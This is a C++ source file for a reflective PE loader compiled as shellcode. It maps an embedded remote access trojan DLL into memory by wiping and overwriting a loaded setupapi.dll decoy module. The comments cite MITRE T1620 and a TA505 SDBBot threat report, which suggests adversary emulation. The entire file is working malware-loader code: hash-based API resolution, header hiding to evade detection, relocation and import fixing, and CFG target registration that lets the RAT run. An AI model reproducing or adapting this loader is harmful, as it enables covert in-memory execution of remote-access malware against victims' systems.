#include <shellcode.hpp>
#include <al/al.hpp>
#include <rat.dll.hpp>
#include <rat.hpp>
#include <algorithm>

data_dirs parse_data(headers pe) {
    data_dirs data{};

    PIMAGE_DATA_DIRECTORY dir = &pe.data[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir->Size && dir->VirtualAddress) {
        data.relocations = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir->Size && dir->VirtualAddress) {
        data.imports = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->Size && dir->VirtualAddress) {
        data.exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
    if (dir->Size && dir->VirtualAddress) {
        data.load_config = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir->Size && dir->VirtualAddress) {
        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir->Size && dir->VirtualAddress) {
        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe.va + dir->VirtualAddress);
    }

    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (dir->Size && dir->VirtualAddress) {
        data.exceptions = reinterpret_cast<PIMAGE_RUNTIME_FUNCTION_ENTRY>(pe.va + dir->VirtualAddress);
        data.exceptions_size = dir->Size;
    }

    return data;
}

headers parse_headers(void* base) {
    headers h{
        .base = static_cast<std::byte*>(base),
        .va   = reinterpret_cast<uintptr_t>(base),
        .dos  = reinterpret_cast<PIMAGE_DOS_HEADER>(base)
    };

    h.nt   = reinterpret_cast<PIMAGE_NT_HEADERS>(h.base + h.dos->e_lfanew);
    h.opt  = &(h.nt->OptionalHeader);
    h.file = &(h.nt->FileHeader);
    h.data = h.opt->DataDirectory;
    h.size = h.opt->SizeOfHeaders;

    return h;
}

/*
 * entry:
 *      About:
 *          Reflective PE loader implemented in Position Independent Code.
 *          Once compiled, the .text section of this PE is dumped and used as
 *          shellcode.
 *      Result:
 *          The RAT DLL, which is also embedded in the .text section of this
 *          PE, is mapped into memory. Once initialized, its primary export is
 *          imported and executed.
 *      Returns:
 *          Returns details about any errors encountered during the load
 *          process. For possible error codes see shellcode.hpp.
 *      MITRE ATT&CK Techniques:
 *          T1620: Reflective Code Loading
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 *      Other References:
 *          Heavily based on sRDI and the other works it is based on.
 *          https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI/ShellcodeRDI.c
 *          
 */
extern "C" shellcode_result entry() {
    shellcode_result result{
        .err = error::SUCCESS
    };

    // Parse the unmapped PE
    headers rat_headers = parse_headers(embedded::rat.data());

    auto ntdll = GM(L"ntdll.dll", al::by_djb2);
    if (!ntdll) {
        result.err = error::NTDLL;
        return result;
    }

    auto kernel32 = GM(L"KERNEL32.DLL", al::by_djb2);
    if (!kernel32) {
        result.err = error::KERNEL32;
        return result;
    }

    auto kernelbase = GM(L"kernelbase.dll", al::by_djb2);
    if (!kernelbase) {
        result.err = error::KERNELBASE;
        return result;
    }

    auto virtual_alloc = GP(kernel32, VirtualAlloc, al::by_djb2);
    if (!virtual_alloc) {
        result.err = error::VIRTUALALLOC;
        return result;
    }

    auto get_module_handle = GP(kernel32, GetModuleHandleA, al::by_djb2);
    if (!get_module_handle) {
        result.err = error::GETMODULEHANDLEA;
        return result;
    }

    auto load_library = GP(kernel32, LoadLibraryA, al::by_djb2);
    if (!load_library) {
        result.err = error::LOADLIBRARYA;
        return result;
    }

    auto get_proc_address = GP(kernel32, GetProcAddress, al::by_djb2);
    if (!get_proc_address) {
        result.err = error::GETPROCADDRESS;
        return result;
    }

    auto virtual_protect = GP(kernel32, VirtualProtect, al::by_djb2);
    if (!virtual_protect) {
        result.err = error::VIRTUALPROTECT;
        return result;
    }

    auto flush_instruction_cache = GP(
        kernel32,
        FlushInstructionCache,
        al::by_djb2
    );
    if (!flush_instruction_cache) {
        result.err = error::FLUSHINSTRUCTIONCACHE;
        return result;
    }

    auto add_function_table = GP(kernel32, RtlAddFunctionTable, al::by_djb2);
    if (!add_function_table) {
        result.err = error::RTLADDFUNCTIONTABLE;
        return result;
    }

    auto set_process_valid_call_targets = GP(
        kernelbase,
        SetProcessValidCallTargets,
        al::by_djb2
    );
    if (!set_process_valid_call_targets) {
        result.err = error::SETPROCESSVALIDCALLTARGETS;
        return result;
    }

    HMODULE decoy = GM(L"setupapi.dll", al::by_djb2);
    if (!decoy) {
        result.err = error::DECOYDLL;
        return result;
    }
    headers host_headers = parse_headers(decoy);

    // May not need to do all of this anymore.
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    auto links = al::peb::memory_order_links(peb);
    auto found = std::ranges::find_if(
        links,
        al::by_djb2(L"setupapi.dll"),
        al::peb::entry_to_name
    );
    if (links.end() == found) {
        result.err = error::DECOYDLL;
        return result;
    }
    found->EntryPoint = reinterpret_cast<PLDR_INIT_ROUTINE>(host_headers.va + rat_headers.opt->AddressOfEntryPoint);

    unsigned long old;
    if (!virtual_protect(
        host_headers.base,
        host_headers.opt->SizeOfImage,
        PAGE_READWRITE,
        &old
    )) {
        result.err = error::FAIL_PROTECT;
        return result;
    }

    // Saving the host DLL's headers to hide the RAT's later. We can't leave
    // them in place since we are relying on the loader to call the
    // entrypoint.
    auto og_headers_buf = static_cast<std::byte*>(virtual_alloc(
        nullptr,
        host_headers.opt->SizeOfHeaders,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    ));

    std::copy_n(
        host_headers.base,
        host_headers.opt->SizeOfHeaders,
        static_cast<std::byte*>(og_headers_buf)
    );
    result.module_base = host_headers.base;
    result.module_size = host_headers.opt->SizeOfImage;
    result.og_headers = og_headers_buf;
    result.og_headers_size = host_headers.opt->SizeOfHeaders;

    // Wipe the host DLL entirely. The PE pointers in host_headers are now
    // invalid.
    std::fill_n(
        reinterpret_cast<unsigned char*>(host_headers.base),
        host_headers.opt->SizeOfImage,
        0
    );

    // Map the RAT headers in immediately and account for their new VA.
    std::copy_n(
        rat_headers.base,
        rat_headers.opt->SizeOfHeaders,
        host_headers.base
    );

    // Track the delta needed for our relocation adjustments.
    ptrdiff_t delta = host_headers.va - rat_headers.opt->ImageBase;

    // Map the raw sections to their respective virtual addresses.
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(rat_headers.nt);
    for (unsigned short i = 0; i < rat_headers.file->NumberOfSections; ++i) {
        std::copy_n(
            reinterpret_cast<std::byte*>(rat_headers.va + sections[i].PointerToRawData),
            sections[i].SizeOfRawData,
            reinterpret_cast<std::byte*>(host_headers.va + sections[i].VirtualAddress)
        );
    }

    // Parse the data directories based on their mapped sections.
    rat_headers.va = host_headers.va;
    rat_headers.base = host_headers.base;
    data_dirs data = parse_data(rat_headers);

    // Process relocations
    if (delta && data.relocations) {
        // Loop over blocks
        while (data.relocations->VirtualAddress) {
            unsigned short n = (data.relocations->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_RECORD);

            // The relocation entries start after the block's header
            auto reloc = reinterpret_cast<PIMAGE_RELOCATION_RECORD>(data.relocations + 1);

            // Loop over relocations in the block
            for (; n > 0; --n) {
                auto ptr = reinterpret_cast<uintptr_t*>(host_headers.va + data.relocations->VirtualAddress + reloc->Offset);

                switch (reloc->Type) {
                case IMAGE_REL_BASED_DIR64:
                    *ptr += delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *ptr += static_cast<DWORD>(delta);
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *ptr += HIWORD(delta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *ptr += LOWORD(delta);
                    break;
                }

                ++reloc;
            }

            // The end of the list is the beginning of the next block.
            data.relocations = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reloc);
        }
    }

    // Imports
    //
    // We skip delay load imports because we know our payload does not have
    // them.
    if (data.imports) {
        while (data.imports->Characteristics) {
            auto og_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(host_headers.va + data.imports->OriginalFirstThunk);
            auto first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(host_headers.va + data.imports->FirstThunk);

            // We do not want to call LoadLibrary during the verifier
            // notification. Instead, we rely on these DLLs already being
            // brought in by the loader DLL.
            HMODULE dll = get_module_handle(reinterpret_cast<const char*>(host_headers.va + data.imports->Name));

            if (!dll) {
                result.err = error::FAIL_LOAD_LIBRARY;
                result.err_string = reinterpret_cast<const char*>(host_headers.va + data.imports->Name);
                return result;
            }

            for (; og_first_thunk->u1.Function; ++first_thunk, ++og_first_thunk) {
                if (IMAGE_SNAP_BY_ORDINAL(og_first_thunk->u1.Ordinal)) {
                    FARPROC address = get_proc_address(
                        dll,
                        MAKEINTRESOURCEA(og_first_thunk->u1.Ordinal)
                    );
                    if (!address) {
                        result.err = error::FAIL_GET_PROC;
                        return result;
                    }

                    first_thunk->u1.Function = reinterpret_cast<uintptr_t>(address);
                }
                else {
                    auto named_import = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(host_headers.va + og_first_thunk->u1.AddressOfData);

                    FARPROC address = get_proc_address(
                        dll,
                        static_cast<const char*>(named_import->Name)
                    );
                    if (!address) {
                        result.err = error::FAIL_GET_PROC;
                        result.err_string = static_cast<const char*>(named_import->Name);
                        return result;
                    }

                    first_thunk->u1.Function = reinterpret_cast<uintptr_t>(address);
                }
            }
            ++data.imports;
        }
    }
    
    // Adjust section memory protections
    bool r, w, x;
    unsigned long protect;
    for (unsigned short i = 0; i < rat_headers.file->NumberOfSections; ++i) {
        if (sections[i].SizeOfRawData) {
            // determine protection flags based on characteristics
            bool r = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
            bool w = (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            bool x = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

            if (!x && !r && !w)
                protect = PAGE_NOACCESS;
            else if (!x && !r && w)
                protect = PAGE_WRITECOPY;
            else if (!x && r && !w)
                protect = PAGE_READONLY;
            else if (!x && r && w)
                protect = PAGE_READWRITE;
            else if (x && !r && !w)
                protect = PAGE_EXECUTE;
            else if (x && !r && w)
                protect = PAGE_EXECUTE_WRITECOPY;
            else if (x && r && !w)
                protect = PAGE_EXECUTE_READ;
            else if (x && r && w)
                protect = PAGE_EXECUTE_READWRITE;

            if (sections[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
                protect |= PAGE_NOCACHE;
            }
        }

        if (!virtual_protect(
            reinterpret_cast<void*>(host_headers.va + sections[i].VirtualAddress),
            sections[i].SizeOfRawData,
            protect,
            &protect
        )) {
            result.err = error::FAIL_PROTECT;
            return result;
        }
    }

    // Flush instruction cache
    // -1 is pseudo handle to current process.
    if (!flush_instruction_cache(reinterpret_cast<HANDLE>(-1), NULL, 0)) {
            result.err = error::FAIL_FLUSH_CACHE;
            return result;
    }

	auto entry = reinterpret_cast<PIMAGE_CFG_ENTRY>(data.load_config->GuardCFFunctionTable);
    for (size_t i = 0; i <= data.load_config->GuardCFFunctionCount; ++i) {
        CFG_CALL_TARGET_INFO cfg{
            .Offset = entry[i].Rva,
            .Flags = CFG_CALL_TARGET_VALID
        };

        set_process_valid_call_targets(
            reinterpret_cast<HANDLE>(-1),
            rat_headers.base,
            rat_headers.opt->SizeOfImage,
            1,
            &cfg
        );
    }

    // TLS callbacks
    if (data.tls) {
        auto callback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(data.tls->AddressOfCallBacks);

        for (; *callback; ++callback) {
            (*callback)(host_headers.base, DLL_PROCESS_ATTACH, nullptr);
        }
    }

    // SEH exceptions
    if (data.exceptions)
    {
        if (!add_function_table(data.exceptions, (data.exceptions_size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, host_headers.va)) {
            result.err = error::FAIL_ADD_FUNCTION_TABLE;
            return result;
        }
    }

    // Grabbing a pointer to DllMain so the RAT DLL can be manually
    // initialized during alternative steps.
    result.dll_main = reinterpret_cast<dll_main_t>(host_headers.va + rat_headers.opt->AddressOfEntryPoint);

    // We don't call DllMain because we are overloading early enough to let
    // the OS handle it.
    auto functions = reinterpret_cast<unsigned long*>(host_headers.va + data.exports->AddressOfFunctions);
    auto rat_export = reinterpret_cast<decltype(&run)>(host_headers.va + functions[0]);
    if (!rat_export) {
        result.err = error::RATEXPORT;
        return result;
    }

    result.func = rat_export;
    return result;
}
